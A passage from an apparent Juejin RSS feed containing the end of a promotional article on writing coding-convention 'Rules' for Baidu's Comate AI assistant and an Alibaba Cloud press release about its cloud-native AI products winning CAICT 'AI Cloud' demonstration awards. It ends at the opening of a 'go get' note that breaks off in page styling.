<li>事件处理函数必须遵循 handle + 动词 + 名词 的格式（如 handleSubmitOrder）。结果：团队代码风格高度统一，新人接手项目不再像“拆盲盒”。</li>
</ul>
<h3 data-id="heading-3">2. 代码结构：给模型戴上“紧箍咒”</h3>
<p>AI 为了省事，有时会写出“面条代码”或者“俄罗斯套娃”式的嵌套。Rules 可以设定架构红线：</p>
<ul>
<li><strong>组件拆分</strong>：单文件行数超过 300 行时，必须提示拆分为子组件。</li>
<li><strong>层级限制</strong>：HTML 标签嵌套不得超过 4 层，多余层级必须通过 CSS 布局解决。</li>
<li>目录规范：生成的图片资源引用路径必须指向 src/assets/images，组件文件必须归档在 src/components/common。结果：代码层次清晰，维护成本大幅降低。</li>
</ul>
<h3 data-id="heading-4">3. 业务逻辑层：AI 变身“逻辑交警”</h3>
<p>这是 Rules 最强大的地方。它能防止 AI 写出“跑得通但业务不对”的代码。</p>
<ul>
<li><strong>防御性编程</strong>：规定所有接口调用必须包裹 try-catch，且错误处理必须调用统一的 ErrorLogger 模块，而不是简单的 console.log。</li>
<li>UI 规范：规定所有“价格”展示必须使用  组件，严禁直接渲染数字。结果：从源头杜绝了业务逻辑漏洞，让代码天生具备健壮性。</li>
</ul>
<h2 data-id="heading-5">03/ 实战案例：资深前端如何用Rules让Comate效率翻倍？</h2>
<p>我们采访了资深前端开发者崔同学，他在高强度的业务开发中，将 Comate + Rules 玩出了新高度。</p>
<h3 data-id="heading-6">😭痛点：永远在“调教”的路上</h3>
<p>在未使用 Rules 之前，崔同学每天要花大量时间做“提示工程”。</p>
<p>“因为我们的项目是基于一套自研的移动端框架，有很多特殊的适配要求。每次让 AI 写页面，它默认都用标准的 React 写法，我得反复纠正：‘用了这个组件库要加按需加载’、‘样式要用 rem 转换函数’。有时候改 AI 写错的代码，比我自己写还累。”</p>
<h3 data-id="heading-7">💪解决方案：打造专属 Rules</h3>
<p>为了摆脱重复劳动，崔同学花了两天时间，将项目开发文档提炼成了 Comate 的 Rules 配置：</p>
<ul>
<li><strong>Class 类名处理</strong>：必须语义化，统一使用 - 连接，且层级扁平化。</li>
<li><strong>CSS 写法</strong>：尺寸单位严禁使用 px，必须调用项目内部的 convertUnit() 函数；样式文件必须启用 CSS Modules。</li>
<li><strong>组件开发</strong>：直接生成符合项目目录结构的组件代码，不要输出“使用示例”等废话。</li>
<li><strong>图片管理</strong>：所有图片占位符必须使用项目指定的 CDN 预设图。</li>
</ul>
<h3 data-id="heading-8">😍成效：从“改代码”到“审代码”</h3>
<p>“配置好 Rules 后，感觉 AI 突然‘开窍’了。”崔同学分享道，“现在生成一个标准的活动落地页，它会自动引入我们要的公共头尾组件，样式自动适配移动端，连埋点代码都能按规范插进去。以前做一个复杂页面要 5 天，现在 3 天就能上线，节省出来的 2 天我可以去研究更难的技术架构。”</p>
<p>最让崔同学印象深刻的是一次 Bug 排查：</p>
<p>“前阵子有个列表渲染的性能问题，如果人工排查可能要逐行看代码，耗时一天。但我之前在 Rules 里配置过‘列表渲染必须使用虚拟滚动组件’的规则。我把代码扔给 Comate，它结合 Rules 瞬间指出：‘此处未检测到虚拟滚动实现，违背性能规范，建议修改如下...’ 10分钟就解决了战斗。”</p>
<h2 data-id="heading-9">04/ 如何在Comate里配置高效的 Rules？</h2>
<p>配置 Rules 就像带徒弟，不能一蹴而就。以下是崔同学总结的“避坑心法”：</p>
<p>1.循序渐进，切忌贪多不要一开始就丢给 AI 几万字的开发文档。建议从“痛点”出发。</p>
<ul>
<li>第一阶段：只约束命名规范和文件路径。</li>
<li>第二阶段：加入常用的工具函数引用规则。</li>
<li>第三阶段：注入复杂的业务逻辑和架构模式。心法：让 AI 帮你写一段代码，发现哪里不合规，就把哪里提炼成 Rule。</li>
</ul>
<p>2.明确边界，安全第一必须</p>
<ul>
<li>在 Rules 中明确：“不引入未授权的外部 npm 包”、“涉及用户隐私字段（如手机号）必须调用 maskPhone 方法脱敏”。这能保证生成代码的合规性，避免引入安全漏洞。</li>
</ul>
<p>3.提供“情绪价值”这是一个有趣的发现：在 Rules 中加入正向反馈机制，能提升 AI 的表现。</p>
<ul>
<li>错误示范：“严禁写错，否则重写。”</li>
<li>正确示范：“你是一个经验丰富的架构师，请帮我按以下规范优化代码。如果在复杂逻辑处理上做得好，我会非常感激。”实测证明，带有角色设定和鼓励语气的 Rules，能让 AI 生成的代码注释更详尽，逻辑解释更清晰。</li>
</ul>
<p>4.全场景适用，打破偏见Rules 不仅是前端的专利。</p>
<ul>
<li><strong>后端</strong>：用 Rules 约束 API 接口必须符合 RESTful 规范，Swagger 注释必须包含具体字段说明。</li>
<li><strong>QA</strong>：用 Rules 规定生成的测试用例必须包含“边界值测试”和“异常流程测试”。</li>
<li><strong>PM/文档</strong>：用 Rules 规定需求文档必须包含“用户故事”、“验收标准”和“数据指标”。</li>
</ul>
<p>Rules 不仅限于前端，已在多领域验证了其价值：</p>
<ul>
<li><strong>后端</strong>：约束 Restful 接口规范及 Swagger 注释标准。</li>
<li><strong>测试</strong>：自动生成包含边界值与异常流程的测试脚本。</li>
<li><strong>文档</strong>：强制需求文档包含“用户故事”与“验收标准”。</li>
</ul>
<p>与其羡慕别人的 AI 懂业务，不如现在就打开Comate，动手调教你的专属Rules，配置你的核心竞争力 <strong>。</strong></p>
<p>🚀 <strong>三步开启 AI 提效之旅：</strong></p>
<ol>
<li><strong>一键下载</strong>：前往 文心快码官网（<a href="https://link.juejin.cn?target=https%3A%2F%2Fcomate.baidu.com%2Fzh%2Fdownload%25EF%25BC%2589%25E4%25B8%258B%25E8%25BD%25BD%25E7%258B%25AC%25E7%25AB%258B" target="_blank" title="https://comate.baidu.com/zh/download%EF%BC%89%E4%B8%8B%E8%BD%BD%E7%8B%AC%E7%AB%8B" ref="nofollow noopener noreferrer">comate.baidu.com/zh/download…</a> AI IDE，或者在 VS Code / JetBrains 插件市场搜索 <strong>"Baidu Comate"</strong> 免费安装。</li>
<li><strong>激活 Rules</strong>：在插件设置面板找到【Rules 配置】，将你们团队的《代码开发规范》要把复制进去（支持自然语言，不用写正则！）。</li>
<li><strong>体验飞跃</strong>：新建一个文件，输入你的需求，见证那些曾经需要反复修改的细节，现在一次性完美呈现。</li>
</ol>
<p><strong>现在下载，新用户更可领取海量免费 Token 额度，让 Comate 免费帮你写代码！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范]]></title>    <link>https://juejin.cn/post/7584059298696478761</link>    <guid>https://juejin.cn/post/7584059298696478761</guid>    <pubDate>2025-12-16T07:55:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584059298696478761" data-draft-id="7583980250734641215" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范"/> <meta itemprop="keywords" content="云原生"/> <meta itemprop="datePublished" content="2025-12-16T07:55:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云云原生"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 原生落地成果获认可，阿里云云原生多项案例入选信通院「AI 云」典型示范
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云云原生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:55:50.000Z" title="Tue Dec 16 2025 07:55:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>12 月 12 日，“2025 年 AI 云产业发展大会”在北京举行。阿里云凭借创新性将云原生技术栈与 AI 工程化深度融合的技术突破与完整的产品化方案，取得了应用于企业 AI 工程化技术规模落地的实践成果，多项落地实践成功入选“AI Cloud 助力大模型场景化和工程化落地”典型示范案例。</p>
<h2 data-id="heading-0">从云原生到 AI 原生，打造企业落地实践示范样本</h2>
<p>为解决 AI 应用架构落地过程中智能体开发、存量系统融合、稳定运行等关键挑战，阿里云云原生应用平台积极推动云原生技术栈与 AI 工程化框架深度融合，推动智能化升级进入全新阶段。</p>
<p>2025年“AI Cloud 助力大模型场景化和工程化落地”案例征集评审工作由中国信息通信研究院主导，旨在推广大模型工程化落地先进路径，树立行业标杆。阿里云云原生凭借 AI 原生领域先进实践经验获得四项认可：</p>
<ul>
<li>阿里云 AI 原生应用架构及产品实践获“AI Cloud Native 创新应用实践”</li>
<li>函数计算 AI 原生应用基础设施平台获“AI Cloud Infra 创新应用实践”</li>
<li>阿里云 AI 中间件获“AI Cloud 中间件创新应用实践”</li>
<li>阿里云可观测智能运维助手 AIOps Agent 获“AI Cloud Stability 创新应用实践”</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2df802bb33e4e46ba5a6107c2820563~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=o3jM05NiO1XxNh8tK0d%2BNoOa2kI%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f7bae7c470f4b3b8a1e2bbbb1453f23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=%2B16YOIXwn0KUKSE77RRNsiRWDlo%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-1">AI Cloud Native 示范案例：阿里云 AI 原生应用架构及产品实践</h3>
<p>“AI Cloud Native 创新应用实践案例”类别旨在面向云服务提供商及企业，表彰聚焦在异构资源管理、弹性伸缩、推理加速、Serverless 等关键能力的成功实践。</p>
<p>阿里云 AI 原生应用架构围绕 AI 原生应用的 DevOps 全生命周期，从架构设计、技术选型、工程实践到运维优化，为企业提供系统性构建 AI 应用的架构指导，并通过阿里云具备毫秒级弹性的<strong>函数计算运行时 AgentRun</strong>、统一流量治理与协议适配的 <strong>AI 网关</strong>、支撑异步高吞吐通信的消息中间件，以及覆盖模型调用、智能体编排和系统交互的<strong>全栈可观测体系</strong>等产品串联形成完整的 AI 原生产品技术栈，帮助企业全面构建具备可信赖性、可扩展性、可进化性的下一代应用体系，并在已有数字化基础上快速叠加 AI 的能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3306a1fc5fb145ed87ec6c4a2d3ea0c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=rlrsnpdr16lJCPfhGNUYpV177i0%3D" alt="图片" loading="lazy"/></p>
<p>2025 年 10 月，阿里云将 AI 原生应用架构系统性思考及产品技术实践沉淀形成《<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247577947%26idx%3D1%26sn%3D6ac4f70f3e84f894a59d8b50360e78a1%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247577947&amp;idx=1&amp;sn=6ac4f70f3e84f894a59d8b50360e78a1&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AI 原生应用架构白皮书</a>》，白皮书覆盖 AI 原生应用的 11 大关键要素，获得 15 位业界专家联名推荐，来自 40 多位一线工程师的实践心得，为 AI 原生应用的标准化、体系化发展提供参考框架。</p>
<h3 data-id="heading-2">AI  Cloud Infra 示范案例：阿里云函数计算 AI 原生应用基础设施平台</h3>
<p>“AI Cloud Infra 创新应用实践案例”类别旨在表彰面向智能计算/存储/网络/资源虚拟化/软硬件协同/异构资源兼容/超智融合等方面有创新性的解决方案或产品。</p>
<p>阿里云函数计算 AgentRun 是一款以全球领先的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Ffc%3Fspm%3Da1z389.11499242.0.0.65452413RXCQWs%26utm_content%3Dg_1000408146" target="_blank" title="https://www.aliyun.com/product/fc?spm=a1z389.11499242.0.0.65452413RXCQWs&amp;utm_content=g_1000408146" ref="nofollow noopener noreferrer">函数计算 FC</a> 为技术底座的一站式 Agentic AI 基础设施平台。它将 Serverless 的极致弹性、零运维和按量付费的特性与 AI 原生应用场景深度融合，深度集成日志、网关等云产品，助力企业实现成本与效率的极致优化，<strong>平均 TCO 降低 60%</strong>。</p>
<p>函数计算 AgentRun 以高代码为核心，秉持生态开放、灵活组装的理念，为 AI Agent 提供从开发、部署到运维的全生命周期管理，让企业和开发者可以只专注于 Agent 的核心业务逻辑创新，无需自建和管理底层基础设施，让 Agentic AI 真正进入企业生产环境。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a99b8afbfbf4758a87391c3c341a7da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=aVIS7%2FO58kTb0%2Fdla9vwru%2Fx5Bc%3D" alt="图片" loading="lazy"/></p>
<p>目前，阿里云函数计算 AgentRun 已让众多企业级智能体“快速上岗”，成为模型服务、AI 工具生态、企业智能体等领域的理想选择，服务于阿里云百炼、魔搭社区、吉利汽车等内外部企业客户与核心产品，支撑多家头部基础模型厂商，构建面向千万用户的 C 端智能体应用如 Z.ai。</p>
<h3 data-id="heading-3">AI Cloud 中间件示范案例：阿里云 AI 中间件</h3>
<p>“AI Cloud 中间件创新应用实践案例”类别旨在面向 AI 中间件产品提供商与应用实践单位表彰在微服务、消息队列、配置与注册中心、数据处理等关键中间件领域的技术创新与落地实践。</p>
<p>阿里云 AI 中间件提供面向分布式多 Agent 架构的基座，包括 AgentScope-Java，基于 Apache RocketMQ 的 AI 能力升级的 AI MQ，AI 网关 Higress，AI 注册与配置中心 Nacos，以及覆盖模型与算力的 AI 可观测体系。AI 中间件已服务于通义千问、阿里云百炼、淘宝、携程、蚂蚁数科、钉钉、优酷、快手、Paypal、BOSS 直聘、大疆、唯品会、汤臣倍健、UU 跑腿、Sealos、国泰产险等互联网、金融、IT 服务等多行业的企业客户。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b14fb5cc9db94dc18cbc646c5f50abce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=QSGW5BAPAYrGTxAYlBtWZ7BroVc%3D" alt="图片" loading="lazy"/></p>
<p>当前，阿里云 AI 中间件核心技术已全面开源，包括 Nacos、Higress、Apache RocketMQ、AgentScope-Java 等，将持续围绕开源生态携手社区开发者共同推动下一代 AI 基础设施的标准化、工程化。</p>
<h3 data-id="heading-4">AI Cloud Stability 示范案例：阿里云可观测智能运维助手 AIOps Agent</h3>
<p>“AI Cloud Stability 创新应用实践案例”类别旨在表彰聚焦智能可观测/AIOPS/智能运维/AI 应用稳定性等方面有创新性的解决方案或产品。</p>
<p>阿里云 AIOps Agent 是国内唯一实现“原始数据→统一图谱→AI 推理→处置闭环”全链路自研的国产方案，成功构建业界首个可观测本体图谱 Umodel 统一模型，统一实体的数据、知识与动作，支撑跨域推理，其基于统一可观测平台融合<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fsls%3Fspm%3Da1z389.11499242.0.0.65452413PLWe13%26utm_content%3Dg_1000408139" target="_blank" title="https://www.aliyun.com/product/sls?spm=a1z389.11499242.0.0.65452413PLWe13&amp;utm_content=g_1000408139" ref="nofollow noopener noreferrer">日志服务 SLS</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Fcms%3Fspm%3Da1z389.11499242.0.0.65452413vvcY0e%26utm_content%3Dg_1000408141" target="_blank" title="https://www.aliyun.com/product/cms?spm=a1z389.11499242.0.0.65452413vvcY0e&amp;utm_content=g_1000408141" ref="nofollow noopener noreferrer">云监控 CMS</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Fproduct%2Farms%3Fspm%3Da1z389.11499242.0.0.65452413yOc5rP%26utm_content%3Dg_1000408142" target="_blank" title="https://www.aliyun.com/product/arms?spm=a1z389.11499242.0.0.65452413yOc5rP&amp;utm_content=g_1000408142" ref="nofollow noopener noreferrer">应用实时监控 ARMS</a> 产品架构，支持千亿行/秒查询，覆盖 200+ 云与开源组件，可在 EB 级数据上实现分钟级根因定位与自然语言运维，打造具备认知与行动能力的智能运维助手。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c048dbad28f4dd4b988bb0f4e4c5ed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476550&amp;x-signature=6sPaLG1%2F7G3bOE26qNaWL%2Ftp%2BLo%3D" alt="图片" loading="lazy"/></p>
<p>阿里云 AIOps Agent 已在 6000+ 企业落地，帮助大型企业客户实现故障 MTTR 从小时级降至小于 15 分钟，<strong>实现 LLM Token 消耗降低大于 90%</strong>。此外，团队主导制定的《云原生可观测数据质量》团体标准已累计申请核心专利 3 项，具备显著行业影响力与规模化落地能力。</p>
<p>未来阿里云将继续坚定从云原生到 AI 原生的发展路线，为千行百业提供人工智能应用落地实践，协同产业各界加速企业数智化转型进程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go get 快速入门（自用笔记）]]></title>    <link>https://juejin.cn/post/7584028251167555611</link>    <guid>https://juejin.cn/post/7584028251167555611</guid>    <pubDate>2025-12-16T07:49:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584028251167555611" data-draft-id="7584094504631566345" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go get 快速入门（自用笔记）"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-12-16T07:49:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卡尔特斯"/> <meta itemprop="url" content="https://juejin.cn/user/4450440831840909"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go get 快速入门（自用笔记）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4450440831840909/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卡尔特斯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:49:32.000Z" title="Tue Dec 16 2025 07:49:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 